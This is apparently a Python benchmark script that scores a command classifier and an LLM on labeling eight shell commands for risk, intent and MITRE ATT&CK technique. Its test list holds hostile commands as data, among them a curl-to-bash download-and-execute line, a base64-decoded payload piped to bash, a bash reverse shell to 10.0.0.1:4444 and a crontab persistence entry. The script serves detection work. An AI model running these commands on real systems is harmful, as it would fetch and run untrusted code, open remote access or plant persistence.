#!/usr/bin/env python3
"""Jev vs gpt-5.6-sol — labeling quality + latency on the 8-command suite."""
from __future__ import annotations

import json
import time
from pathlib import Path

from data_pipeline import jev_client, jev_labels
from data_pipeline import llm, normalize, prompts

TESTS = [
    {"cmd": "df -h && free -m && uptime", "risk": "risk.benign", "tech": []},
    {"cmd": "curl -fsSL https://raw.githubusercontent.com/x/y/main/i.sh | bash",
     "risk": "risk.malicious", "intents": ["intent.download_execute"],
     "tactics": ["tactic.execution"], "tech": ["technique.T1105", "technique.T1059"]},
    {"cmd": "echo aGk= | base64 -d | bash", "risk": "risk.malicious",
     "intents": ["intent.encode_obfuscate", "intent.execute"], "tech": ["technique.T1027.010", "technique.T1059"]},
    {"cmd": "sudo systemctl restart nginx", "risk": "risk.benign", "tech": []},
    {"cmd": "find / -perm -4000 -type f 2>/dev/null", "risk": "risk.suspicious",
     "tactics": ["tactic.discovery", "tactic.privilege_escalation"], "tech": []},
    {"cmd": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "risk": "risk.malicious",
     "intents": ["intent.reverse_shell"], "tactics": ["tactic.command_and_control"],
     "tech": ["technique.T1059", "technique.T1071.001"]},
    {"cmd": "(crontab -l; echo '* * * * * /tmp/.x') | crontab -", "risk": "risk.malicious",
     "intents": ["intent.persistence", "intent.scheduled_task"], "tactics": ["tactic.persistence"],
     "tech": ["technique.T1053.003"]},
    {"cmd": "apt-get install -y netcat-openbsd python3-pip", "risk": "risk.benign", "tech": []},
]


def eval_jev(threshold=0.4, topk=5):
    from schema import all_label_ids, group_offsets
    ids = all_label_ids(); off = group_offsets()
    intent_ids = set(ids[off["intent"][0]:off["intent"][1]])
    tactic_ids = set(ids[off["tactic"][0]:off["tactic"][1]])
    tech_ids = set(ids[off["technique"][0]:off["technique"][1]])

    risk_ok = tech_ok = intent_ok = tactic_ok = 0
    tech_den = intent_den = tactic_den = 0
    lats = []
    rows = []
    for t in TESTS:
        res = jev_labels.classify(t["cmd"])
        lats.append(res.latency_s)
        labels = jev_labels.hard_labels(res, threshold=threshold)
        vec = jev_labels.soft_vector(res)
        # risk = argmax over first 3
        risk = labels[0] if labels and labels[0].startswith("risk.") else None
        if risk == t["risk"]:
            risk_ok += 1
        # technique topk + threshold
        tech_scores = [(ids[off['technique'][0]+i], v) for i, v in enumerate(vec[off['technique'][0]:])]
        top_tech = {l for l, v in sorted(tech_scores, key=lambda x: -x[1])[:topk] if v >= 0.05}
        if t.get("tech"):
            tech_den += 1
            if any(w in top_tech for w in t["tech"]):
                tech_ok += 1
        intents = {l for l in labels if l in intent_ids}
        if t.get("intents"):
            intent_den += 1
            if any(w in intents for w in t["intents"]):
                intent_ok += 1
        tactics = {l for l in labels if l in tactic_ids}
        if t.get("tactics"):
            tactic_den += 1
            if any(w in tactics for w in t["tactics"]):
                tactic_ok += 1
        rows.append({"cmd": t["cmd"][:50], "risk": risk, "top_tech": sorted(top_tech), "intents": sorted(intents)})
    n = len(TESTS)
    return {
        "risk": f"{risk_ok}/{n}", "risk_acc": risk_ok/n,
        "tech": f"{tech_ok}/{tech_den}", "tech_acc": tech_ok/tech_den if tech_den else 0,
        "intent": f"{intent_ok}/{intent_den}", "intent_acc": intent_ok/intent_den if intent_den else 0,
        "tactic": f"{tactic_ok}/{tactic_den}", "tactic_acc": tactic_ok/tactic_den if tactic_den else 0,
        "avg_lat": sum(lats)/len(lats), "rows": rows,
    }


def eval_llm():
    risk_ok = tech_ok = intent_ok = tactic_ok = 0
    tech_den = intent_den = tactic_den = 0
    lats = []
    for t in TESTS:
        parsed, res = llm.chat_json(prompts.label_prompt(t["cmd"]), model=llm.DEFAULT_MODEL)
        lats.append(res.latency_s)
        labels = normalize.combined_labels(parsed) if parsed else []
        risk = next((l for l in labels if l.startswith("risk.")), None)
        if risk == t["risk"]:
            risk_ok += 1
        techs = {l for l in labels if l.startswith("technique.")}
        if t.get("tech"):
            tech_den += 1
            if any(w in techs for w in t["tech"]):
                tech_ok += 1
        intents = {l for l in labels if l.startswith("intent.")}
        if t.get("intents"):
            intent_den += 1
            if any(w in intents for w in t["intents"]):
                intent_ok += 1
        tactics = {l for l in labels if l.startswith("tactic.")}
        if t.get("tactics"):
            tactic_den += 1
            if any(w in tactics for w in t["tactics"]):
                tactic_ok += 1
    n = len(TESTS)
    return {
        "risk": f"{risk_ok}/{n}", "risk_acc": risk_ok/n,
        "tech": f"{tech_ok}/{tech_den}", "tech_acc": tech_ok/tech_den if tech_den else 0,
        "intent": f"{intent_ok}/{intent_den}", "intent_acc": intent_ok/intent_den if intent_den else 0,
        "tactic": f"{tactic_ok}/{tactic_den}", "tactic_acc": tactic_ok/tactic_den if tactic_den else 0,
        "avg_lat": sum(lats)/len(lats),
    }


if __name__ == "__main__":
    print("=== Jev (jev-latest) ===")
    j = eval_jev()
    print(f"  risk {j['risk']}  tech {j['tech']}  intent {j['intent']}  tactic {j['tactic']}  lat {j['avg_lat']:.2f}s")
    for r in j["rows"]:
        print(f"    {r['cmd'][:44]:44s} risk={r['risk']:16s} top_tech={sorted(r['top_tech'])}")

    print("\n=== gpt-5.6-sol ===")
    g = eval_llm()
    print(f"  risk {g['risk']}  tech {g['tech']}  intent {g['intent']}  tactic {g['tactic']}  lat {g['avg_lat']:.2f}s")

    out = {"jev": {k: v for k, v in j.items() if k != "rows"}, "gpt-5.6-sol": g}
    Path("configs/jev_vs_gpt.json").write_text(json.dumps(out, indent=2, ensure_ascii=False))
    print("\n→ configs/jev_vs_gpt.json")
